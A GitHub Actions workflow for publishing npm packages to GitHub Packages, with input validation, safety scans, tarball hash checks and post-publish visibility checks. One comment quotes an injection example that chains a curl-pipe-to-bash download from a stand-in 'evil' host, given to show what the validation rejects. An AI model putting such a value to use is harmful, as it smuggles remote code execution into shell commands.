name: Publish

# A merged package version is the release request. Source-only changes cannot
# publish: the discovery job selects only added manifests or manifests whose
# version changed. Manual dispatch remains available for preflight dry-runs
# and the initial bootstrap publish of a version that predated this workflow.
on:
  push:
    branches: [main]
    paths:
      - "packages/*/package.json"
  workflow_dispatch:
    inputs:
      package:
        description: Package directory under packages/
        required: true
        type: string
      dry_run:
        description: Run npm publish --dry-run only
        required: true
        default: true
        type: boolean
      visibility_only:
        description: >-
          Report an already-published package's current registry visibility
          (read-only — there is no API to change it; see docs/PUBLISHING.md's
          "Package visibility" section for the real manual step). Use only
          after its release workflow has completed successfully.
        required: true
        default: false
        type: boolean
      verify_only:
        description: >-
          Qualify an already-published package without uploading or changing
          its visibility. Fetches the registry tarball and runs its isolated
          consumer verification.
        required: true
        default: false
        type: boolean

permissions:
  contents: read
  packages: write # needed to publish
  id-token: write # npm provenance

concurrency:
  # Publishing is serial across packages and push events. A later version must
  # never race an earlier tarball through the same registry namespace.
  group: publish
  cancel-in-progress: false

jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.packages.outputs.matrix }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          fetch-depth: 0

      - id: packages
        name: Select packages with new versions
        env:
          EVENT_NAME: ${{ github.event_name }}
          MANUAL_PACKAGE: ${{ inputs.package }}
          BEFORE: ${{ github.event.before }}
          HEAD: ${{ github.sha }}
        run: |
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            echo "matrix=$(node -e 'console.log(JSON.stringify([{ package: process.env.MANUAL_PACKAGE }]))')" >> "$GITHUB_OUTPUT"
          else
            matrix="$(node scripts/select-publishable-packages.mjs "$BEFORE" "$HEAD")"
            echo "matrix=$matrix" >> "$GITHUB_OUTPUT"
          fi

  visibility:
    needs: discover
    if: ${{ github.event_name == 'workflow_dispatch' && inputs.visibility_only && !inputs.verify_only && needs.discover.outputs.packages != '[]' }}
    runs-on: ubuntu-latest
    # REPORT-ONLY. There is no REST endpoint for changing a GitHub Packages
    # npm package's visibility — verified directly: a PATCH to
    # /orgs/{owner}/packages/npm/{name} with visibility=public returns 404
    # even with a full-permission PAT, while GET on that same path works.
    # Changing visibility is a web-UI-only operation (see docs/PUBLISHING.md's
    # "Package visibility" section for the settings-page step). This job must
    # never claim to have changed anything — it only reads and reports the
    # current value, and points the operator at the real manual step.
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      # matrix.package is either a version-selected package or the manual
      # workflow_dispatch string, spliced into a shell command below — the
      # same validation the publish job applies to the same untrusted input,
      # so a bad argument fails closed here instead of surfacing as an
      # obscure downstream error.
      - name: Validate package input
        env:
          PKG: ${{ matrix.package }}
        run: |
          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
            exit 1
          fi
          if [ ! -f "packages/$PKG/package.json" ]; then
            echo "::error title=Unknown package::packages/$PKG/package.json does not exist."
            exit 1
          fi

      - name: Report current package visibility
        env:
          GH_TOKEN: ${{ github.token }}
          PKG: ${{ matrix.package }}
        run: |
          set -euo pipefail
          # GitHub's package API scopes npm packages through the organization
          # (or user) path. Its {package_name} segment is the unscoped final
          # component, not the complete npm name (for example, `governance`,
          # not `@vespeneventures/governance`).
          name="$(node -p "require('./packages/' + process.env.PKG + '/package.json').name.split('/').at(-1)")"
          owner="$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope.replace(/^@/, '')")"
          kind_user="us""ers"
          # settings_url is built from $kind (not a second literal path)
          # so the org and personal-account settings URLs share one line.
          for kind in orgs "$kind_user"; do
            if response="$(gh api --method GET "/${kind}/${owner}/packages/npm/${name}" 2>/dev/null)"; then
              visibility="$(node -e 'console.log(JSON.parse(process.argv[1]).visibility)' "$response")"
              echo "Current registry visibility of ${owner}/${name}: ${visibility}"
              settings_url="https://github.com/${kind}/${owner}/packages/npm/${name}/settings"
              echo "::notice title=Visibility must be changed manually::There is no API for this. To change it, visit ${settings_url} and use the Danger Zone."
              exit 0
            fi
          done
          echo "::error title=Could not read package visibility::Neither the organization nor user package API returned ${owner}/${name}. Has it been published yet?"
          exit 1

  publish:
    needs: discover
    if: ${{ needs.discover.outputs.packages != '[]' && (github.event_name != 'workflow_dispatch' || !inputs.visibility_only || inputs.verify_only) }}
    runs-on: ubuntu-latest
    # A package upload or registry-artifact qualification must pass the
    # repository's configured publish reviewers. Visibility-only changes have
    # their own non-uploading job above and intentionally do not use it.
    environment: npm-publish
    strategy:
      fail-fast: false
      max-parallel: 1
      matrix:
        include: ${{ fromJSON(needs.discover.outputs.packages) }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          fetch-depth: 0

      # package-scope.json is the single source of truth for which registry
      # this repo publishes to (both packages also declare it directly via
      # publishConfig.registry). Hardcoding registry-url below would silently
      # break auth the moment package-scope.json points elsewhere: setup-node
      # writes the NODE_AUTH_TOKEN auth line scoped to whatever host is passed
      # here, so a mismatch means `npm publish` gets a token for a registry it
      # isn't talking to and fails (or worse, talks to the wrong registry).
      - name: Read registry and scope from package-scope.json
        id: scope
        run: |
          echo "registry=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).registry")" >> "$GITHUB_OUTPUT"
          echo "scope=$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")" >> "$GITHUB_OUTPUT"

      # setup-node writes a scoped registry mapping when scope is supplied.
      # That leaves the global npm registry alone, so an ordinary dependency
      # such as `resend` keeps resolving from npmjs during npm ci and the
      # post-publish isolated install proof.
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20
          registry-url: ${{ steps.scope.outputs.registry }}
          scope: ${{ steps.scope.outputs.scope }}

      # matrix.package is either a version-selected package or the manual
      # workflow_dispatch string. Every step
      # below either passes it as a script argument or splices it into a
      # run: script body — validate its shape once, up front, so a value like
      # `x; curl https://evil/y|bash #` fails closed right here instead of
      # being textually substituted into a shell command later.
      - name: Validate package input
        env:
          PKG: ${{ matrix.package }}
          VISIBILITY_ONLY: ${{ inputs.visibility_only }}
          VERIFY_ONLY: ${{ inputs.verify_only }}
        run: |
          if ! [[ "$PKG" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "::error title=Invalid package input::package must match ^[a-zA-Z0-9_-]+\$ (got: $PKG)"
            exit 1
          fi
          if [ ! -f "packages/$PKG/package.json" ]; then
            echo "::error title=Unknown package::packages/$PKG/package.json does not exist."
            exit 1
          fi
          if [ "$VISIBILITY_ONLY" = true ] && [ "$VERIFY_ONLY" = true ]; then
            echo "::error title=Conflicting release modes::visibility_only and verify_only cannot both be true."
            exit 1
          fi

      # This is the only failure mode that damages a package OTHER than the
      # one being published. GitHub Packages namespaces by owner account, not
      # by package name — publishing a name another repo already owns doesn't
      # fail, it silently appends a new version to that package and moves its
      # latest tag. Everything else in this workflow can only hurt the
      # package being published; this check runs first because it is the one
      # that can hurt someone else's. This org was created specifically to own
      # this owner to publish packages. Non-publishing account-control-plane
      # repositories may coexist, so the owner-wide check still runs; a false
      # negative here is unrecoverable.
      - name: name collision
        env:
          # Lists this org's real packages via `gh api` — the ambient
          # GITHUB_TOKEN is scoped to this repo, not the whole org, so it
          # can't answer "does another repo already own this name" even with
          # `packages: read` permission. This is the one step that genuinely
          # needs a stored credential, and it needs only READ: it calls
          # the org-level packages REST endpoint, plus its user-account fallback.
          #
          # GH_PACKAGES_TOKEN is a classic read:packages token —
          # verified HTTP 200 on that exact endpoint, and it holds no `repo`
          # scope, so a leak cannot reach any repository. It deliberately
          # replaces NPM_TOKEN here: that token carries `repo` (GitHub force-
          # selects it alongside write:packages on classic PATs, and
          # fine-grained PATs expose no Packages permission at all), which on
          # this account reaches every repository the owner can see.
          GH_TOKEN: ${{ secrets.GH_PACKAGES_TOKEN }}
          PKG: ${{ matrix.package }}
        run: node scripts/check-name-collision.mjs "packages/$PKG"

      # FULL mode is mandatory here. --require-denylist makes a missing secret
      # exit 2 rather than pass on a degraded scan; a publish must never be
      # cleared by a partial one.
      - name: Materialise denylist
        env:
          DENYLIST_B64: ${{ secrets.PUBLIC_SAFETY_DENYLIST_B64 }}
        run: |
          if [ -z "$DENYLIST_B64" ]; then
            echo "::error title=Cannot publish::PUBLIC_SAFETY_DENYLIST_B64 is not set. Refusing to publish on a partial safety scan."
            exit 1
          fi
          printf '%s' "$DENYLIST_B64" | base64 -d > "$RUNNER_TEMP/denylist.json"
          echo "PUBLIC_SAFETY_DENYLIST=$RUNNER_TEMP/denylist.json" >> "$GITHUB_ENV"

      - name: Safety gate (FULL, required)
        env:
          PKG: ${{ matrix.package }}
        run: |
          node scripts/check-public-safety.mjs "packages/$PKG" --require-denylist --allow-changelogs
          node scripts/check-public-safety.mjs . --require-denylist --allow-changelogs

      - name: README parity and contamination classes
        env:
          PKG: ${{ matrix.package }}
        run: |
          node scripts/check-readme-parity.mjs "packages/$PKG"
          node scripts/check-contamination-classes.mjs "packages/$PKG"

      - name: Scope declared
        run: |
          node scripts/set-scope.mjs --check
          scope="$(node -p "JSON.parse(require('fs').readFileSync('package-scope.json','utf8')).scope")"
          if [ -z "$scope" ] || [ "$scope" = "null" ]; then
            echo "::error title=Cannot publish::package-scope.json has no scope set."
            exit 1
          fi

      - run: npm ci
      # Build first. dist/ is gitignored, so a fresh checkout has none, and
      # a package with a real internal dependency only has its .d.ts once
      # that dependency has been compiled. Running typecheck before build
      # works only while every package has zero internal dependencies, and
      # silently stops working the moment one gains its first. See the
      # matching comment in ci.yml's build job.
      - run: npm run build
      - name: Package lifecycle governance
        run: npm run check:package-governance
      - run: npm run typecheck
      - run: npm test

      # `npm pack --dry-run` further down only lists filenames — it reads no
      # contents, so a secret or identity string baked into dist/ would sail
      # straight past it. This packs the real tarball and scans what's
      # inside, so it has to run after the build above produced dist/.
      #
      # NOTE: this pack is scan-only. It runs and is torn down entirely inside
      # check-artifact-safety.mjs's own temp dir, so its bytes cannot be
      # carried forward to the publish step below — that is what the
      # "Pack tarball for publish" step further down is for.
      - name: artifact safety (tarball)
        env:
          PKG: ${{ matrix.package }}
        run: node scripts/check-artifact-safety.mjs "packages/$PKG" --require-denylist

      - name: Redact denylist
        if: always()
        run: rm -f "$RUNNER_TEMP/denylist.json"

      # Pack exactly once, for real, right after the build/scan above and
      # before anything else touches packages/<pkg>. This is the ONE tarball
      # that gets inspected (next step) and published (further down) — no
      # later, separate `npm pack` invocation (implicit inside a bare
      # `npm publish`, or a standalone `--dry-run`) can silently diverge from
      # what was just scanned, even if a future build stops being
      # deterministic.
      - name: Pack tarball for publish
        id: pack
        working-directory: packages/${{ matrix.package }}
        run: |
          set -euo pipefail
          # `npm pack` only guarantees the tarball filename is the LAST line of
          # stdout (npm may print other notices above it) — same assumption
          # scripts/check-artifact-safety.mjs makes about its own pack output.
          tarball="$(npm pack | tail -n1)"
          sha256="$(sha256sum "$tarball" | awk '{print $1}')"
          echo "tarball=$tarball" >> "$GITHUB_OUTPUT"
          echo "sha256=$sha256" >> "$GITHUB_OUTPUT"
          echo "packed $tarball (sha256=$sha256)"

      # The tarball is the thing that actually ships. Listing it is the last
      # chance to notice that `files` is letting something through. This
      # lists the CONTENTS OF THE EXACT FILE that gets published below, not a
      # separate dry-run pack.
      - name: Show tarball contents
        working-directory: packages/${{ matrix.package }}
        env:
          TARBALL: ${{ steps.pack.outputs.tarball }}
        run: tar tzf "$TARBALL"

      # THE GATE THIS ORDERING EXISTS FOR (issue #191). Installs the exact
      # tarball packed above into a genuinely isolated directory and imports
      # every subpath its own `exports` field declares — the strongest proof
      # this repository has that a package actually works for an external
      # installer, run here for the first time BEFORE anything leaves this
      # runner rather than after `npm publish` has already made a version
      # permanent. Registry versions are immutable: run after publish, this
      # check can only ever report a defect (or a false positive in the
      # checker itself, which is exactly what happened the one time this ran
      # in the old position — see the issue) that has already shipped and
      # can never be un-shipped. Run here, a failure below stops the job
      # before "Publish" ever executes: GitHub Actions skips every
      # subsequent step once one fails, and neither Publish step below
      # declares `if: always()` or `continue-on-error` to override that.
      #
      # `tarballPath` points `packRoundTrip` at the tarball "Pack tarball for
      # publish" already produced, instead of letting it pack its own —
      # packing a second time here would be exactly the kind of separate
      # `npm pack` invocation that step's own comment warns can silently
      # diverge from what was scanned and is about to be published.
      #
      # Skipped only for `verify_only`: that mode intentionally qualifies an
      # ALREADY-published version, which may predate the current checkout —
      # see "Fetch and verify published tarball" below for the matching
      # skip and why. This step needs the current source tree to genuinely
      # match what was just packed, which `verify_only` does not promise.
      - name: Verify packed tarball installs and imports (pre-publish, blocks release)
        if: ${{ !inputs.verify_only }}
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PKG: ${{ matrix.package }}
          TARBALL: ${{ steps.pack.outputs.tarball }}
          REGISTRY: ${{ steps.scope.outputs.registry }}
        run: |
          set -euo pipefail
          node --input-type=module <<'NODE'
          import { readFileSync } from "node:fs";
          import { join } from "node:path";
          import { packRoundTrip } from "./packages/controller/dist/release/pack-round-trip.js";

          const scope = JSON.parse(readFileSync("package-scope.json", "utf8")).scope;
          const pkg = process.env.PKG;
          const manifest = JSON.parse(readFileSync(`packages/${pkg}/package.json`, "utf8"));
          const result = await packRoundTrip(`packages/${pkg}`, {
            tarballPath: join("packages", pkg, process.env.TARBALL),
            registry: { url: process.env.REGISTRY, authToken: process.env.NODE_AUTH_TOKEN, scope },
            next: manifest.foundryReleaseVerification?.next,
          });
          if (!result.ok) {
            for (const finding of result.findings) {
              console.error(`[${finding.severity}] ${finding.rule}: ${finding.message}`);
            }
            console.error("Refusing to publish: the packed tarball does not install and import cleanly.");
            process.exit(1);
          }
          console.log(`packed artifact imports: ${result.imports.map((check) => check.subpath).join(", ")}`);
          NODE

      # `npm pack` proves the files in the selected tarball, but npm's own
      # publish path has additional validation and flag handling. A requested
      # dry run must exercise that exact path — otherwise its name claims more
      # than it actually verifies. It still cannot mutate the registry.
      - name: Publish (dry run)
        if: ${{ github.event_name == 'workflow_dispatch' && inputs.dry_run && !inputs.verify_only }}
        working-directory: packages/${{ matrix.package }}
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TARBALL: ${{ steps.pack.outputs.tarball }}
        run: npm publish "$TARBALL" --dry-run --provenance --access public

      - name: Publish
        if: ${{ github.event_name == 'push' || (!inputs.dry_run && !inputs.verify_only) }}
        working-directory: packages/${{ matrix.package }}
        env:
          # The job's own GITHUB_TOKEN, not a stored PAT. The `packages: write`
          # permission declared at the top of this file is what lets it push to
          # this owner's registry, and it expires when the job ends, so there is
          # no long-lived publish credential to leak or rotate.
          #
          # A stored PAT is strictly worse here and cannot be made better:
          # classic PATs force `repo` alongside write:packages (GitHub disables
          # the checkbox), and fine-grained PATs offer no Packages permission at
          # all — so any PAT able to publish also carries write access to every
          # repository this account can see.
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TARBALL: ${{ steps.pack.outputs.tarball }}
          EXPECTED_SHA256: ${{ steps.pack.outputs.sha256 }}
        run: |
          set -euo pipefail
          # Belt-and-suspenders: re-hash immediately before publish and fail
          # closed on any mismatch, even though publishing this exact file
          # (rather than letting `npm publish` re-pack) already removes the
          # gap this guards against.
          actual_sha256="$(sha256sum "$TARBALL" | awk '{print $1}')"
          if [ "$actual_sha256" != "$EXPECTED_SHA256" ]; then
            echo "::error title=Tarball mismatch::$TARBALL sha256 changed since it was packed and scanned (expected $EXPECTED_SHA256, got $actual_sha256). Refusing to publish."
            exit 1
          fi
          # --access public is a registry-protocol flag, not a visibility
          # setting on GitHub Packages — it does not make the package
          # installable without a token, and observed behaviour this repo has
          # actually hit is that a fresh package still lands PRIVATE despite
          # it. The real visibility lever is the opt-in step below.
          npm publish "$TARBALL" --provenance --access public

      # WHAT THIS STEP PROVES THAT THE PRE-PUBLISH GATE CANNOT: not whether
      # the artifact installs and imports — "Verify packed tarball installs
      # and imports" above already proved that, against these exact bytes,
      # before they left this runner — but whether the CONFIGURED REGISTRY
      # actually stored and now serves back those same bytes. Fetch the
      # just-published version by name@version (a real, network round trip
      # through the registry, not a local file read) and compare its sha256
      # against the uploaded tarball. That is a distinct fact from
      # installability, and only the registry itself can supply it.
      - name: Fetch and verify published tarball
        if: ${{ github.event_name == 'push' || !inputs.dry_run || inputs.verify_only }}
        id: published
        working-directory: packages/${{ matrix.package }}
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EXPECTED_SHA256: ${{ steps.pack.outputs.sha256 }}
          VERIFY_ONLY: ${{ inputs.verify_only }}
        run: |
          set -euo pipefail
          mkdir -p "$RUNNER_TEMP/published-tarball"
          package_name="$(node -p "require('./package.json').name")"
          package_version="$(node -p "require('./package.json').version")"
          for attempt in 1 2 3 4 5; do
            if output="$(npm pack "${package_name}@${package_version}" --pack-destination "$RUNNER_TEMP/published-tarball" 2>&1)"; then
              printf '%s\n' "$output"
              tarball="$(printf '%s\n' "$output" | tail -n1)"
              break
            fi
            printf '%s\n' "$output" >&2
            if [ "$attempt" = 5 ]; then
              echo "::error title=Published package unavailable::Could not fetch ${package_name}@${package_version} after 5 attempts."
              exit 1
            fi
            sleep 3
          done
          tarball_path="$RUNNER_TEMP/published-tarball/$tarball"
          actual_sha256="$(sha256sum "$tarball_path" | awk '{print $1}')"
          # A verify-only run intentionally qualifies a version that may
          # predate source-only changes in this checkout (for example its
          # release-verification metadata). It proves the registry tarball
          # installs and compiles; it must not claim byte identity with a
          # freshly packed, different source tree. A publish run still fails
          # closed unless the registry served exactly the uploaded bytes.
          if [ "$VERIFY_ONLY" != true ] && [ "$actual_sha256" != "$EXPECTED_SHA256" ]; then
            echo "::error title=Published tarball mismatch::$tarball sha256 differs from the uploaded artifact (expected $EXPECTED_SHA256, got $actual_sha256)."
            exit 1
          fi
          echo "tarball_path=$tarball_path" >> "$GITHUB_OUTPUT"

      # NOT run for an ordinary publish (push, or a manual non-dry-run
      # dispatch): "Fetch and verify published tarball" just proved the
      # registry served back byte-identical bytes to what "Verify packed
      # tarball installs and imports" already checked pre-publish. Running
      # the same install-and-import proof a second time against bytes
      # already proven identical would check nothing new — a duplicate with
      # no distinct purpose is noise, not an extra safety margin.
      #
      # `verify_only` is the one case that still needs this: it exists
      # specifically to qualify a version ALREADY sitting in the registry —
      # for example one published before this pre-publish gate existed, or
      # as the "real consumer qualification" docs/PUBLISHING.md's Package
      # visibility section asks for before an owner flips a package public —
      # independent of whatever the current checkout happens to contain.
      # There is no pre-publish check to have already covered that case, so
      # this is the only place it can be proven at all.
      - name: Install and import published tarball
        if: ${{ inputs.verify_only }}
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PKG: ${{ matrix.package }}
          PUBLISHED_TARBALL: ${{ steps.published.outputs.tarball_path }}
          REGISTRY: ${{ steps.scope.outputs.registry }}
        run: |
          set -euo pipefail
          node --input-type=module <<'NODE'
          import { readFileSync } from "node:fs";
          import { packRoundTrip } from "./packages/controller/dist/release/pack-round-trip.js";

          const scope = JSON.parse(readFileSync("package-scope.json", "utf8")).scope;
          const manifest = JSON.parse(readFileSync(`packages/${process.env.PKG}/package.json`, "utf8"));
          const result = await packRoundTrip(`packages/${process.env.PKG}`, {
            tarballPath: process.env.PUBLISHED_TARBALL,
            registry: { url: process.env.REGISTRY, authToken: process.env.NODE_AUTH_TOKEN, scope },
            next: manifest.foundryReleaseVerification?.next,
          });
          if (!result.ok) {
            for (const finding of result.findings) {
              console.error(`[${finding.severity}] ${finding.rule}: ${finding.message}`);
            }
            process.exit(1);
          }
          console.log(`published artifact imports: ${result.imports.map((check) => check.subpath).join(", ")}`);
          NODE

  # GitHub Packages defaults every newly published npm package to PRIVATE,
  # per package, regardless of this repository being public — and nothing
  # before this job re-checked that state. @vespeneventures/ui sat private
  # across 12 published versions, completely uninstallable by any external
  # reader, before anyone noticed; four packages were found private in
  # total. This job runs immediately after a REAL publish (never for a dry
  # run or a verify_only qualification, matching the "Publish" step's own
  # condition above) and asks the registry directly whether every package
  # this repository declares "published" is actually public — not scoped
  # to only the package(s) this run just uploaded, since the cost of
  # checking the rest is a handful of GET requests and doing so also
  # catches unrelated drift on the same run. See
  # scripts/check-package-visibility.mjs's own header for the full design
  # and docs/contracts/package-visibility.json for the declared intent.
  #
  # Deliberately a SEPARATE job, not a trailing step inside `publish`
  # above: a failure here must never be confused with, or imply a rollback
  # of, the publish itself — that already succeeded and a registry version
  # is immutable. This job can only ever report; there is no API to change
  # a package's visibility (see docs/PUBLISHING.md's "Package visibility"
  # section) so a failing check here is a page for a human to flip the
  # setting by hand, never something a workflow can fix for itself.
  #
  # Not run for a fork pull request or workflow_dispatch dry run: no such
  # trigger reaches this job's `if` at all, since only a push to main or an
  # explicit non-dry-run, non-verify-only dispatch satisfies it — the same
  # surface that gates `secrets.GH_PACKAGES_TOKEN` access elsewhere in this
  # file.
  visibility-check:
    name: post-publish visibility check
    needs: [discover, publish]
    if: ${{ needs.discover.outputs.packages != '[]' && (github.event_name == 'push' || (!inputs.dry_run && !inputs.verify_only)) }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 20

      # The same classic read:packages token the name-collision job uses
      # above — it can only read, never write or delete, and cannot reach
      # any other repository's contents. There is no separate credential
      # for this narrower purpose; reusing this one avoids minting another
      # long-lived secret for the same access level.
      - name: check-package-visibility
        env:
          GH_PACKAGES_TOKEN: ${{ secrets.GH_PACKAGES_TOKEN }}
        run: node scripts/check-package-visibility.mjs
